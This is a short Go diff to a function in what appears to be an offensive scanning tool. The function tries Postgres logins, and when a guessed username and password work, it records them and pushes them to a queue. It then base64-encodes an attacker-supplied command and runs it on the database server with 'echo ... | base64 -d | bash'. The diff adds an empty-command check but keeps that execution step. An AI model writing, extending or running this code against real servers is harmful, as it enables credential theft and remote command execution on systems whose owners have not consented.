@@ -40,12 +40,17 @@ func PostgresConn(info *common.HostInfo, user string, pass string) (flag bool, e
 		defer db.Close()
 		err = db.Ping()
 		if err == nil {
-			result := fmt.Sprintf("[+] Postgres:%v:%v:%v %v", Host, Port, Username, Password)
+			result := fmt.Sprintf("[%s:%s] Postgres credential %s/%s", Host, Port, Username, Password)
 			log.Println(result)
+			if info.Queue != nil {
+				info.Queue.Push(result)
+			}
 			cmd := info.Command.TCPCommand
-			b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
-			cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
-			PostgreExec(db, cmd)
+			if cmd != "" {
+				b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
+				cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
+				PostgreExec(db, cmd)
+			}
 			flag = true
 		}
 	}
